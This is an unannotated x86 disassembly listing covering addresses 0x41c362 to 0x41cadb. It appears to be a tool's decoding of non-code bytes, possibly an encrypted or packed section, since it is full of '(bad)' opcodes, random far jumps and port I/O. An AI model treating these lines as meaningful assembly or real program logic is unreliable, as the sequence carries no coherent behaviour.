  41c362:	je     0x41c36e
  41c364:	(bad)  
  41c365:	enter  0xe4eb,0xbf
  41c369:	cmp    esp,DWORD PTR [edi+esi*2-0x958079a]
  41c370:	loopne 0x41c306
  41c372:	cmp    bh,bl
  41c374:	ret    
  41c375:	lods   al,BYTE PTR ds:[esi]
  41c376:	cmp    eax,0xd715bf87
  41c37b:	ins    DWORD PTR es:[edi],dx
  41c37c:	test   eax,0xabb10175
  41c381:	cld    
  41c382:	retf   
  41c383:	imul   ebx,ebx,0x34
  41c386:	push   0xffffffac
  41c388:	jne    0x41c3f1
  41c38a:	cmp    DWORD PTR [ecx+eiz*2+0x5a],esp
  41c38e:	rol    BYTE PTR [esi],1
  41c390:	(bad)  
  41c391:	jmp    0x1ff9:0xcca84497
  41c398:	je     0x41c371
  41c39a:	sub    dl,ah
  41c39c:	and    al,0x8d
  41c39e:	add    eax,0x6ab6fb77
  41c3a3:	ja     0x41c413
  41c3a5:	push   esi
  41c3a6:	mov    al,0x11
  41c3a8:	in     al,0x52
  41c3aa:	mov    dh,0xee
  41c3ac:	dec    esi
  41c3ad:	jmp    0x41c353
  41c3af:	out    dx,al
  41c3b0:	aas    
  41c3b1:	mov    ecx,0xdc7e4013
  41c3b6:	cmp    ebp,DWORD PTR [edi+0x456fab36]
  41c3bc:	adc    eax,0xb5f1665e
  41c3c1:	shl    BYTE PTR [esi-0x15],cl
  41c3c4:	push   eax
  41c3c5:	and    BYTE PTR [esi+esi*4-0x41cae81d],ah
  41c3cc:	sub    DWORD PTR [eax-0x2a2c3d3a],ebx
  41c3d2:	test   DWORD PTR [ebx-0x96edb4a],esi
  41c3d8:	push   es
  41c3d9:	outs   dx,BYTE PTR ds:[esi]
  41c3da:	mov    edx,0xca198885
  41c3df:	leave  
  41c3e0:	inc    esp
  41c3e1:	lock and BYTE PTR [edi],ch
  41c3e4:	mov    al,0x93
  41c3e6:	or     DWORD PTR [edx-0x5e9780a2],0xffffffba
  41c3ed:	pushf  
  41c3ee:	test   BYTE PTR [ebp-0xbeb3d29],ah
  41c3f4:	xor    al,0x6f
  41c3f6:	mov    dl,0xa7
  41c3f8:	sub    al,BYTE PTR [esp+edx*2]
  41c3fb:	aas    
  41c3fc:	dec    edx
  41c3fd:	and    BYTE PTR [eax],bl
  41c3ff:	loope  0x41c451
  41c401:	ins    BYTE PTR es:[edi],dx
  41c402:	mov    ds:0x684c6db0,al
  41c407:	inc    esi
  41c408:	mov    ah,0x81
  41c40a:	mov    ebx,DWORD PTR [edi+0x59f6523d]
  41c410:	lods   eax,DWORD PTR ds:[esi]
  41c411:	cmp    ebx,DWORD PTR [ebx+ebx*2]
  41c414:	mov    DWORD PTR [eax+0xd],ecx
  41c417:	sbb    ah,BYTE PTR [eax+0x7ddf97a7]
  41c41d:	cs enter 0xe91d,0xe7
  41c422:	cs mov ?,esp
  41c425:	in     eax,0x2
  41c427:	or     eax,0xf3be8e94
  41c42c:	dec    ebp
  41c42d:	fsub   DWORD PTR [ecx+0x4730bcdf]
  41c433:	lock jge 0x41c492
  41c436:	or     al,0x19
  41c438:	retf   0xf803
  41c43b:	bts    DWORD PTR [ebx],esi
  41c43e:	(bad)  
  41c43f:	jno    0x41c4a6
  41c441:	add    DWORD PTR [edi],edi
  41c443:	mov    dh,0xe9
  41c445:	arpl   WORD PTR [esi-0x6d],dx
  41c448:	jp     0x41c3dc
  41c44a:	pop    esp
  41c44b:	sub    cl,dh
  41c44d:	je     0x41c41c
  41c44f:	hlt    
  41c450:	xchg   ebp,eax
  41c451:	pop    esp
  41c452:	sbb    DWORD PTR [edx],ecx
  41c454:	pushf  
  41c455:	nop
  41c456:	add    DWORD PTR [edx],eax
  41c458:	ror    BYTE PTR [eax+0x21fd521c],cl
  41c45e:	sub    BYTE PTR [edi-0x7c],cl
  41c461:	or     esp,edi
  41c463:	mov    esi,0x64cda993
  41c468:	pop    ecx
  41c469:	mov    ecx,0x95dd18d4
  41c46e:	ficom  DWORD PTR [edi+0x51e1aa38]
  41c474:	inc    eax
  41c475:	jmp    0x41c417
  41c477:	pushf  
  41c478:	adc    DWORD PTR [ebp+0x3a],edx
  41c47b:	rcl    al,1
  41c47d:	aad    0xed
  41c47f:	push   0x32
  41c481:	adc    DWORD PTR [edx+0xfd],0x0
  41c48b:	add    BYTE PTR [eax],al
  41c48d:	add    BYTE PTR [eax],al
  41c48f:	add    BYTE PTR [eax],al
  41c491:	mov    ah,0x4f
  41c493:	sbb    al,0x53
  41c495:	call   DWORD PTR [ebx-0x1]
  41c498:	out    dx,eax
  41c499:	inc    esi
  41c49a:	dec    esp
  41c49b:	add    eax,0xe42cbe32
  41c4a0:	pop    ebp
  41c4a1:	adc    eax,DWORD PTR [ecx+0x1]
  41c4a4:	add    BYTE PTR [ebx-0x54fffffd],ch
  41c4aa:	sbb    DWORD PTR [ebx-0x3f],0xffffff9a
  41c4ae:	test   DWORD PTR [ebp+0x1b],0x1deb1933
  41c4b5:	jmp    0xea75:0xa5ab4bbf
  41c4bc:	xchg   ebx,eax
  41c4bd:	push   ds
  41c4be:	sbb    al,BYTE PTR [edx+0x46]
  41c4c1:	out    0xc0,eax
  41c4c3:	lahf   
  41c4c4:	add    BYTE PTR [ecx],dl
  41c4c6:	adc    eax,0x2fbe8a27
  41c4cb:	addr16 mov al,0x90
  41c4ce:	rol    DWORD PTR [edi+eax*1+0x7e],1
  41c4d2:	cmp    eax,ecx
  41c4d4:	rcr    DWORD PTR [edi+0x71],1
  41c4d7:	int3   
  41c4d8:	mov    al,0x93
  41c4da:	and    ebp,DWORD PTR [edi]
  41c4dc:	out    0xe3,al
  41c4de:	ins    BYTE PTR es:[edi],dx
  41c4df:	lods   eax,DWORD PTR ds:[esi]
  41c4e0:	test   DWORD PTR [ebx+eiz*2],0xdc8c0f63
  41c4e7:	aas    
  41c4e8:	pop    ebp
  41c4e9:	pop    ebx
  41c4ea:	aas    
  41c4eb:	or     eax,0xdb6067f3
  41c4f0:	dec    esp
  41c4f1:	add    al,0xe4
  41c4f3:	adc    DWORD PTR [ebx+0x12262a09],edx
  41c4f9:	adc    dl,BYTE PTR [esi]
  41c4fb:	fld    TBYTE PTR [eax]
  41c4fd:	mov    ebx,0x1f3b9383
  41c502:	mov    DWORD PTR [eax+0x78c20058],ecx
  41c508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c509:	in     al,0x2f
  41c50b:	imul   ecx,DWORD PTR [eax-0x28e9ff38],0x4e
  41c512:	inc    edx
  41c513:	mov    ds:0x9c02b69d,al
  41c518:	or     esi,0x1d
  41c51b:	ret    0x36c7
  41c51e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c51f:	mov    cl,0x6c
  41c521:	sub    ecx,DWORD PTR [eax+0x3c]
  41c524:	and    ebp,DWORD PTR [ebx+0xbfea828]
  41c52a:	icebp  
  41c52b:	test   BYTE PTR [ecx],0xe0
  41c52e:	push   edx
  41c52f:	cmp    BYTE PTR [ecx+0x1b],ch
  41c532:	xor    eax,0xff4ce300
  41c537:	and    ah,cl
  41c539:	outs   dx,DWORD PTR ds:[esi]
  41c53a:	sbb    eax,0x352b7fc7
  41c53f:	imul   eax,DWORD PTR [ebx+0x3d9590b6],0xe
  41c546:	or     BYTE PTR [eax+0x79712341],0x39
  41c54d:	and    ebx,DWORD PTR [edx]
  41c54f:	ins    BYTE PTR es:[edi],dx
  41c550:	add    ecx,esi
  41c552:	in     eax,0x60
  41c554:	arpl   WORD PTR [eax-0x5d],cx
  41c557:	in     eax,dx
  41c558:	mov    esi,0x2706a804
  41c55d:	and    cl,BYTE PTR [edi]
  41c55f:	out    dx,al
  41c560:	mov    edx,0xadc5973e
  41c565:	cmc    
  41c566:	and    al,0x6c
  41c568:	pop    ebp
  41c569:	(bad)  
  41c56a:	stc    
  41c56b:	dec    ebx
  41c56c:	loop   0x41c54d
  41c56e:	pop    esi
  41c56f:	cli    
  41c570:	mov    cl,0x7
  41c572:	outs   dx,BYTE PTR ds:[esi]
  41c573:	lock es leave 
  41c576:	out    0x3e,al
  41c578:	adc    esi,esi
  41c57a:	int    0x9d
  41c57c:	outs   dx,BYTE PTR ds:[esi]
  41c57d:	add    BYTE PTR [eax+0x7dbcc052],dh
  41c583:	aad    0xed
  41c585:	fiadd  DWORD PTR [edi+ebx*2-0x37]
  41c589:	adc    bh,BYTE PTR [edx-0x7d]
  41c58c:	loopne 0x41c513
  41c58e:	add    DWORD PTR [ebx+0x423d6781],ecx
  41c594:	fs icebp 
  41c596:	add    DWORD PTR [eax],ecx
  41c598:	inc    ebp
  41c599:	(bad)
  41c59d:	icebp  
  41c59e:	fistp  QWORD PTR [edi]
  41c5a0:	stos   DWORD PTR es:[edi],eax
  41c5a1:	mov    esp,0x8dc5e67b
  41c5a6:	sbb    dh,BYTE PTR [ecx]
  41c5a8:	push   cs
  41c5a9:	sbb    BYTE PTR ds:0xe07d9389,ah
  41c5af:	add    DWORD PTR [eax-0x5b2dc1bd],edi
  41c5b5:	and    al,0x2d
  41c5b7:	(bad)  
  41c5b8:	cld    
  41c5b9:	jns    0x41c53e
  41c5bb:	xchg   edx,eax
  41c5bc:	xor    eax,0xd0db9a3a
  41c5c1:	into   
  41c5c2:	jecxz  0x41c635
  41c5c4:	mov    ds,WORD PTR [edi]
  41c5c6:	jle    0x41c641
  41c5c8:	test   ecx,esp
  41c5ca:	dec    esp
  41c5cb:	dec    esi
  41c5cc:	pop    edi
  41c5cd:	mov    dh,0x8
  41c5cf:	iret   
  41c5d0:	int    0x63
  41c5d2:	in     al,dx
  41c5d3:	push   ebx
  41c5d4:	rol    BYTE PTR [esi+0x4c],1
  41c5d7:	jne    0x41c64e
  41c5d9:	sub    BYTE PTR ds:0xc3cd2e08,dh
  41c5df:	(bad)  
  41c5e0:	jae    0x41c5a8
  41c5e2:	in     al,dx
  41c5e3:	push   0xffffffba
  41c5e5:	or     al,0xaa
  41c5e7:	rcl    ch,cl
  41c5e9:	retf   0x1dca
  41c5ec:	jp     0x41c650
  41c5ee:	and    dh,BYTE PTR [edx]
  41c5f0:	xchg   DWORD PTR [edi-0x15b96103],eax
  41c5f6:	cld    
  41c5f7:	inc    ebp
  41c5f8:	dec    edi
  41c5f9:	jbe    0x41c672
  41c5fb:	cmp    BYTE PTR [edi-0x38],0xfb
  41c5ff:	fidiv  WORD PTR [ebp+0x3f7824c]
  41c605:	imul   esp,esi,0xfffffff2
  41c608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c609:	and    al,ch
  41c60b:	adc    BYTE PTR [edx+0x4798110c],0xb3
  41c612:	xchg   ebp,eax
  41c613:	xor    DWORD PTR [ecx-0x64],esp
  41c616:	dec    ecx
  41c617:	into   
  41c618:	jne    0x41c5ec
  41c61a:	mov    gs,WORD PTR [esi]
  41c61c:	cmp    eax,0x25bd1b6d
  41c621:	sbb    BYTE PTR [edx],0xdf
  41c624:	inc    ecx
  41c625:	jmp    0x41c5d9
  41c627:	mov    eax,ds:0x46aeb690
  41c62c:	cli    
  41c62d:	pop    ss
  41c62e:	ret    
  41c62f:	test   edx,esi
  41c631:	out    dx,al
  41c632:	xchg   esi,eax
  41c633:	into   
  41c634:	rcr    DWORD PTR [ebp+eiz*8-0x36debbf],0x23
  41c63c:	fsub   QWORD PTR [eax+eiz*8]
  41c63f:	popa   
  41c640:	leave  
  41c641:	and    dl,BYTE PTR [edi-0x6c]
  41c644:	and    ecx,DWORD PTR [edi-0x454b3261]
  41c64a:	mov    dh,0x44
  41c64c:	mov    ebx,fs
  41c64e:	out    dx,al
  41c64f:	xchg   ebp,eax
  41c650:	adc    BYTE PTR [edi+0x6b],0x56
  41c654:	and    DWORD PTR [eax],ebx
  41c656:	mov    al,ds:0x5d72aa21
  41c65b:	or     al,0x12
  41c65d:	stos   DWORD PTR es:[edi],eax
  41c65e:	dec    eax
  41c65f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c660:	stos   BYTE PTR es:[edi],al
  41c661:	mov    esp,0x66bd8e03
  41c666:	xor    DWORD PTR [esi+edx*4+0x54b6ab21],esp
  41c66d:	js     0x41c6e8
  41c66f:	rol    DWORD PTR [ecx-0x80cc811],cl
  41c675:	aam    0x51
  41c677:	push   0xe55e153c
  41c67c:	mov    ds:0xbe43b499,eax
  41c681:	pop    edi
  41c682:	jp     0x41c699
  41c684:	mov    al,ds:0x14ba0898
  41c689:	lea    eax,[ecx-0xd]
  41c68c:	shl    esi,1
  41c68e:	(bad)  
  41c68f:	xor    eax,0x4896eaf7
  41c694:	shl    DWORD PTR [eax-0x45f14d90],1
  41c69a:	jmp    0xa00f:0xa19664ab
  41c6a1:	jae    0x41c64b
  41c6a3:	aam    0x2d
  41c6a5:	sub    dh,BYTE PTR [ecx-0x5f]
  41c6a8:	mov    ah,0xa5
  41c6aa:	inc    esp
  41c6ab:	repnz data16 int3 
  41c6ae:	lea    esp,[esi-0x239b2824]
  41c6b4:	cwde   
  41c6b5:	push   ds
  41c6b6:	xchg   ecx,eax
  41c6b7:	jle    0x41c6eb
  41c6b9:	mov    DWORD PTR [ebx-0x75935edf],edx
  41c6bf:	jmp    0xe965051d
  41c6c4:	popf   
  41c6c5:	dec    DWORD PTR [ebx]
  41c6c7:	sbb    edx,DWORD PTR [edi-0xd]
  41c6ca:	ret    
  41c6cb:	int3   
  41c6cc:	jns    0x41c6f4
  41c6ce:	pop    eax
  41c6cf:	adc    dl,BYTE PTR [edi]
  41c6d1:	addr16 add DWORD PTR [bp+0x6df],0xffffff88
  41c6d8:	jecxz  0x41c6e8
  41c6da:	push   esi
  41c6db:	sbb    al,0xfc
  41c6dd:	xchg   ebx,eax
  41c6de:	pop    ebx
  41c6df:	jl     0x41c712
  41c6e1:	mov    ds:0x61778a3e,eax
  41c6e6:	adc    al,0x68
  41c6e8:	dec    ecx
  41c6e9:	xchg   DWORD PTR [edi-0x2f01dfcf],edx
  41c6ef:	pop    edx
  41c6f0:	pop    ebp
  41c6f1:	retf   
  41c6f2:	int    0x91
  41c6f4:	xor    ebx,ebp
  41c6f6:	sub    ebp,esp
  41c6f8:	mov    al,ds:0x23cb6ee0
  41c6fd:	leave  
  41c6fe:	and    DWORD PTR [ebx+ebp*4+0x3f409c25],ebp
  41c705:	out    dx,al
  41c706:	pop    edi
  41c707:	imul   esi,DWORD PTR [ebx+0x14864da],0x2f
  41c70e:	xchg   esp,eax
  41c70f:	addr16 add eax,0x4c7d82ec
  41c715:	lods   al,BYTE PTR ds:[esi]
  41c716:	and    DWORD PTR [edi+esi*1],edx
  41c719:	in     eax,dx
  41c71a:	dec    esi
  41c71b:	into   
  41c71c:	test   eax,0x4a4a36f5
  41c721:	fisubr WORD PTR ds:0x399c37c9
  41c727:	jg     0x41c6ad
  41c729:	mov    ebx,0xa60b0aa1
  41c72e:	jecxz  0x41c788
  41c730:	mov    WORD PTR [esi-0x682f719e],fs
  41c736:	hlt    
  41c737:	jae    0x41c79d
  41c739:	retf   
  41c73a:	int    0xc9
  41c73c:	inc    edi
  41c73d:	inc    ebp
  41c73e:	inc    esp
  41c73f:	pop    ds
  41c740:	ja     0x41c78b
  41c742:	and    eax,0x4b0e6fc1
  41c747:	push   0xfffffffe
  41c749:	add    DWORD PTR [esi+0x1c],edx
  41c74c:	mov    ds:0xc4ddd166,al
  41c751:	les    edi,FWORD PTR [ebp-0x28]
  41c754:	mov    ah,0xfb
  41c756:	aas    
  41c757:	aad    0x9c
  41c759:	daa    
  41c75a:	gs jp  0x41c71c
  41c75d:	inc    edx
  41c75e:	ret    0xd792
  41c761:	leave  
  41c762:	mov    bl,0x9a
  41c764:	pop    edi
  41c765:	adc    bh,BYTE PTR [eax-0x363e1589]
  41c76b:	je     0x41c7b0
  41c76d:	outs   dx,DWORD PTR ds:[esi]
  41c76e:	jae    0x41c7b5
  41c770:	sar    BYTE PTR [ebx+0x19ea7023],cl
  41c776:	mov    eax,0x35c41e03
  41c77b:	ds pushf 
  41c77d:	retf   0x8bf9
  41c780:	xchg   ebp,eax
  41c781:	das    
  41c782:	cmp    eax,0xe99d7951
  41c787:	jmp    0x41c716
  41c789:	xchg   ebx,edx
  41c78b:	xor    BYTE PTR [esi-0x74],bh
  41c78e:	jb     0x41c809
  41c790:	in     eax,0x30
  41c792:	xchg   edx,ebx
  41c794:	push   edi
  41c795:	out    0xd2,eax
  41c797:	jbe    0x41c729
  41c799:	pop    ss
  41c79a:	std    
  41c79b:	aad    0xa1
  41c79d:	cmp    esp,DWORD PTR cs:[edi]
  41c7a0:	out    dx,al
  41c7a1:	cmp    al,BYTE PTR [ebx-0x64ed8a8c]
  41c7a7:	(bad)  
  41c7a8:	lds    esi,FWORD PTR [esi+0x6e]
  41c7ab:	popf   
  41c7ac:	fdiv   DWORD PTR [eax+0x4b5ba80d]
  41c7b2:	rcr    DWORD PTR [ebp+0x3d],0x4b
  41c7b6:	push   ebp
  41c7b7:	mov    dl,0x74
  41c7b9:	lea    edx,[esi]
  41c7bb:	sub    edx,DWORD PTR [ebx+0x32727187]
  41c7c1:	sbb    eax,0x5d0bfff9
  41c7c6:	sbb    DWORD PTR [eax],ebp
  41c7c8:	out    dx,eax
  41c7c9:	sar    cl,0x15
  41c7cc:	mov    eax,edx
  41c7ce:	lods   eax,DWORD PTR ds:[esi]
  41c7cf:	sar    dh,cl
  41c7d1:	loope  0x41c84a
  41c7d3:	mov    al,0xe8
  41c7d5:	mov    al,0x59
  41c7d7:	push   cs
  41c7d8:	jle    0x41c78d
  41c7da:	out    0x80,eax
  41c7dc:	push   esi
  41c7dd:	nop
  41c7de:	jb     0x41c85f
  41c7e0:	clc    
  41c7e1:	sbb    eax,0x2300123e
  41c7e6:	xchg   esi,eax
  41c7e7:	jmp    0x7ab4:0xb36273c4
  41c7ee:	cli    
  41c7ef:	cwde   
  41c7f0:	cmp    BYTE PTR [eax+esi*8],dh
  41c7f3:	retf   
  41c7f4:	std    
  41c7f5:	sbb    al,0xc3
  41c7f7:	fmul   st(5),st
  41c7f9:	loope  0x41c86a
  41c7fb:	xchg   ebp,eax
  41c7fc:	pop    ss
  41c7fd:	ret    0xbca
  41c800:	xor    ch,BYTE PTR ds:0x4306fd49
  41c806:	dec    edx
  41c807:	and    al,0x68
  41c809:	xchg   BYTE PTR [ebx-0x2],ch
  41c80c:	jae    0x41c888
  41c80e:	ja     0x41c880
  41c810:	pop    ebp
  41c811:	or     al,0x9f
  41c813:	leave  
  41c814:	push   0xe57a99a4
  41c819:	xlat   BYTE PTR ds:[ebx]
  41c81a:	mov    al,ah
  41c81c:	mov    al,0x1d
  41c81e:	adc    DWORD PTR [edi+0x6c],edi
  41c821:	rol    DWORD PTR [ecx],cl
  41c823:	dec    edx
  41c824:	stc    
  41c825:	fstp   QWORD PTR [ebx+0x3d]
  41c828:	mov    ecx,0xbe21244d
  41c82d:	sahf   
  41c82e:	pusha  
  41c82f:	loope  0x41c8af
  41c831:	mov    cx,0xb7ca
  41c835:	mov    DWORD PTR [ecx+0x5f],0x29274abd
  41c83c:	leave  
  41c83d:	mov    DWORD PTR [eax],eax
  41c83f:	push   edi
  41c840:	jle    0x41c87e
  41c842:	mov    esp,?
  41c844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c845:	(bad)  
  41c846:	mov    ebp,DWORD PTR [edx+eiz*1-0x8]
  41c84a:	pop    esp
  41c84b:	xchg   esi,eax
  41c84c:	out    0xaf,eax
  41c84e:	jns    0x41c86b
  41c850:	cmp    cl,BYTE PTR [ebx]
  41c852:	fisub  WORD PTR [ebx+0x0]
	...
  41c860:	add    ah,al
  41c862:	leave  
  41c863:	or     BYTE PTR [eax-0x12131ef3],ah
  41c869:	add    BYTE PTR [esi-0x1e],al
  41c86c:	or     DWORD PTR [edi],esi
  41c86e:	xor    al,BYTE PTR [eax+0x144be3b]
  41c874:	add    BYTE PTR [ebx+0x5000003],ch
  41c87a:	mov    al,ds:0x9395ee28
  41c87f:	mov    DWORD PTR [eax],ebx
  41c881:	outs   dx,DWORD PTR ds:[esi]
  41c882:	mov    DWORD PTR [bx],edi
  41c885:	xchg   ebp,eax
  41c886:	ins    BYTE PTR es:[edi],dx
  41c887:	xchg   BYTE PTR ds:0xa7d6967c,dh
  41c88d:	data16 (bad) 
  41c88f:	lea    esi,[eax]
  41c891:	dec    ecx
  41c892:	clc    
  41c893:	repnz mov eax,ds:0x440b0293
  41c899:	or     edx,eax
  41c89b:	es aas 
  41c89d:	inc    esp
  41c89e:	out    dx,al
  41c89f:	popf   
  41c8a0:	pop    ss
  41c8a1:	lods   al,BYTE PTR ds:[esi]
  41c8a2:	lea    eax,[edx]
  41c8a4:	mov    esi,0xc3194200
  41c8a9:	fs cdq 
  41c8ab:	xchg   edx,eax
  41c8ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8ad:	xor    eax,0x90185611
  41c8b2:	xor    DWORD PTR [ecx-0x23],ebx
  41c8b5:	leave  
  41c8b6:	pushf  
  41c8b7:	adc    dh,0xd3
  41c8ba:	test   BYTE PTR [edi+0x33],ah
  41c8bd:	lea    edx,[edx-0x25]
  41c8c0:	mov    dh,0x4b
  41c8c2:	jecxz  0x41c85e
  41c8c4:	fwait
  41c8c5:	and    eax,0xd84da2e3
  41c8ca:	nop
  41c8cb:	out    dx,al
  41c8cc:	retf   0xb869
  41c8cf:	push   DWORD PTR [edx+0x26]
  41c8d2:	xchg   ecx,eax
  41c8d3:	cmp    bl,BYTE PTR [eax]
  41c8d5:	sbb    eax,0x9c9fda05
  41c8da:	sbb    BYTE PTR [eax-0x25],bl
  41c8dd:	shl    BYTE PTR [ebx],1
  41c8df:	xchg   ecx,eax
  41c8e0:	fs (bad) 
  41c8e2:	dec    esi
  41c8e3:	test   eax,eax
  41c8e5:	inc    ebp
  41c8e6:	jp     0x41c8b7
  41c8e8:	mov    ah,dl
  41c8ea:	scas   ax,WORD PTR es:[edi]
  41c8ec:	test   eax,0x5685837b
  41c8f1:	std    
  41c8f2:	fsub   DWORD PTR [esp+ebp*4]
  41c8f5:	adc    DWORD PTR [ebp+0x44c2ead7],eax
  41c8fb:	sub    edi,DWORD PTR [ebp+0x1973d986]
  41c901:	push   ebx
  41c902:	aad    0x59
  41c904:	data16 jp 0x41c895
  41c907:	and    BYTE PTR [eax],ch
  41c909:	push   ds
  41c90a:	push   ebx
  41c90b:	mov    ds,WORD PTR [edi+0x6de62240]
  41c911:	push   es
  41c912:	inc    ebx
  41c913:	sbb    dh,BYTE PTR [ebp+0x25]
  41c916:	mov    ebp,0xb9cf4f64
  41c91b:	nop
  41c91c:	ins    DWORD PTR es:[edi],dx
  41c91d:	sub    DWORD PTR [edi-0x4d],0xffffff83
  41c921:	idiv   DWORD PTR [eax+0x1f]
  41c924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c925:	lock add dh,BYTE PTR [eax+0xcf8abd6]
  41c92c:	jmp    0x900f:0x6e88d678
  41c933:	shl    bl,cl
  41c935:	loope  0x41c8fd
  41c937:	sahf   
  41c938:	es jecxz 0x41c926
  41c93b:	mov    esp,0x9dbace1b
  41c940:	mov    cl,0x68
  41c942:	jmp    0xfaed0690
  41c947:	sbb    al,0x18
  41c949:	ret    
  41c94a:	out    dx,al
  41c94b:	push   edx
  41c94c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c94d:	out    0xec,al
  41c94f:	fwait
  41c950:	push   cs
  41c951:	or     ebx,DWORD PTR [ecx+0x1bbc4e26]
  41c957:	sbb    DWORD PTR [ebp-0x26],0xa3812964
  41c95e:	hlt    
  41c95f:	cli    
  41c960:	mov    ds:0xb5a162,eax
  41c965:	push   edi
  41c966:	add    BYTE PTR [edx+0x32],dh
  41c969:	cld    
  41c96a:	push   edi
  41c96b:	inc    esp
  41c96c:	(bad)  
  41c96d:	out    0x38,eax
  41c96f:	je     0x41c946
  41c971:	adc    BYTE PTR [edx+0x65],ch
  41c974:	and    DWORD PTR [edx+ebp*8-0x15],0xfffffff3
  41c979:	test   BYTE PTR [edx-0xe06e1f2],al
  41c97f:	lods   al,BYTE PTR ds:[esi]
  41c980:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c981:	mov    ds:0xaeb7731d,eax
  41c986:	pop    ecx
  41c987:	mov    ebp,0x808fb6b7
  41c98c:	jmp    0x51f8:0x151f2a3b
  41c993:	or     BYTE PTR [ebp-0x531939f1],0xc6
  41c99a:	jns    0x41c934
  41c99c:	xchg   BYTE PTR [ebx-0x27db5760],bl
  41c9a2:	or     eax,0x30db29d9
  41c9a7:	pop    ebx
  41c9a8:	mov    ebp,0xff4db715
  41c9ad:	jg     0x41c9c6
  41c9af:	push   esi
  41c9b0:	mov    eax,esi
  41c9b2:	mov    cl,0x12
  41c9b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9b5:	adc    edx,DWORD PTR [esi]
  41c9b7:	push   ecx
  41c9b8:	add    al,0xc1
  41c9ba:	jmp    0x51ea0acd
  41c9bf:	stc    
  41c9c0:	ficomp DWORD PTR [esp+ecx*8-0x37cc8f82]
  41c9c7:	out    0xba,eax
  41c9c9:	cs (bad) 
  41c9cb:	mov    al,ds:0xfd4280cc
  41c9d0:	ja     0x41c95f
  41c9d2:	ja     0x41c97d
  41c9d4:	rcr    DWORD PTR [ebx],cl
  41c9d6:	cmp    DWORD PTR [eax],edi
  41c9d8:	or     cl,BYTE PTR [eax]
  41c9da:	stos   DWORD PTR es:[edi],eax
  41c9db:	mov    edx,esp
  41c9dd:	xor    eax,0xf4c90156
  41c9e2:	test   eax,0x1505229e
  41c9e7:	gs jnp 0x41c9b0
  41c9ea:	test   al,0xff
  41c9ec:	xor    bl,BYTE PTR gs:[eax]
  41c9ef:	repz mov ch,0xe4
  41c9f2:	aas    
  41c9f3:	je     0x41ca65
  41c9f5:	and    BYTE PTR [ecx],bh
  41c9f7:	mov    esp,ebp
  41c9f9:	retf   0x8278
  41c9fc:	cmc    
  41c9fd:	jle    0x41ca74
  41c9ff:	out    0x7a,al
  41ca01:	sub    BYTE PTR [ebp-0x740544b0],bh
  41ca07:	mov    ebp,0x17832a2a
  41ca0c:	dec    eax
  41ca0d:	mov    bh,0x99
  41ca0f:	pop    ebp
  41ca10:	sbb    esp,DWORD PTR [eax+0x240c100e]
  41ca16:	or     DWORD PTR [eax+0x1c],ebx
  41ca19:	sbb    eax,0xb3d1d004
  41ca1e:	push   ebx
  41ca1f:	or     cl,dl
  41ca21:	stos   BYTE PTR es:[edi],al
  41ca22:	pop    esi
  41ca23:	clc    
  41ca24:	nop
  41ca25:	pop    edi
  41ca26:	dec    esi
  41ca27:	mov    ds:0x59cc7fae,eax
  41ca2c:	jnp    0x41ca80
  41ca2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca2f:	jo     0x41ca72
  41ca31:	pusha  
  41ca32:	aam    0x93
  41ca34:	cmp    edi,ecx
  41ca36:	xor    eax,0x468af399
  41ca3b:	cmp    BYTE PTR [ebp+0x2],al
  41ca3e:	in     al,0x37
  41ca40:	test   eax,0x76c80aac
  41ca45:	jge    0x41ca3c
  41ca47:	xchg   ax,ax
  41ca49:	pop    es
  41ca4a:	push   edi
  41ca4b:	int3   
  41ca4c:	dec    ecx
  41ca4d:	dec    BYTE PTR [ecx]
  41ca4f:	jnp    0x41ca76
  41ca51:	jno    0x41ca67
  41ca53:	dec    edx
  41ca54:	std    
  41ca55:	shl    dl,1
  41ca57:	sar    ebp,cl
  41ca59:	and    ebx,DWORD PTR [eax-0x1e]
  41ca5c:	dec    ecx
  41ca5d:	fld    QWORD PTR [ebx+0x72d791a2]
  41ca63:	jo     0x41cad8
  41ca65:	xor    eax,0x707ae2e
  41ca6a:	stos   BYTE PTR es:[edi],al
  41ca6b:	popa   
  41ca6c:	xor    al,0x9
  41ca6e:	xor    eax,0xb4f096db
  41ca73:	pop    eax
  41ca74:	sbb    al,BYTE PTR [edx+0x5ceae201]
  41ca7a:	dec    edx
  41ca7b:	cdq    
  41ca7c:	jge    0x41ca2e
  41ca7e:	loopne 0x41ca82
  41ca80:	arpl   WORD PTR [ebp-0x846aead],bp
  41ca86:	xor    eax,0x112a4671
  41ca8b:	add    al,0x52
  41ca8d:	sahf   
  41ca8e:	push   cs
  41ca8f:	dec    edx
  41ca90:	test   edi,edi
  41ca92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca93:	pushf  
  41ca94:	xchg   BYTE PTR [ebp+esi*4+0xde5a3e0],ah
  41ca9b:	add    DWORD PTR [ebp+ebx*1-0x4a],esp
  41ca9f:	mov    bh,0xe7
  41caa1:	mov    DWORD PTR [ebx+0xe],0x6bdb49ef
  41caa8:	fwait
  41caa9:	xor    BYTE PTR [edi],ch
  41caab:	data16 loop 0x41caee
  41caae:	cmp    eax,0x6459bfee
  41cab3:	(bad)  
  41cab4:	jge    0x41cb32
  41cab6:	jno    0x41caf1
  41cab8:	cli    
  41cab9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41caba:	jmp    0x41cb1d
  41cabc:	leave  
  41cabd:	pop    ds
  41cabe:	and    eax,0xb6606a5e
  41cac3:	mov    edx,0x418ac19c
  41cac8:	dec    edx
  41cac9:	mov    DWORD PTR [edi-0x60],edi
  41cacc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cacd:	dec    edi
  41cace:	xchg   esp,eax
  41cacf:	push   ds
  41cad0:	jge    0x41ca90
  41cad2:	jle    0x41cb1e
  41cad4:	fisubr WORD PTR [ebx]
  41cad6:	mov    ah,0xa9
  41cad8:	std    
  41cad9:	into   
  41cada:	push   ebp
  41cadb:	inc    ebp
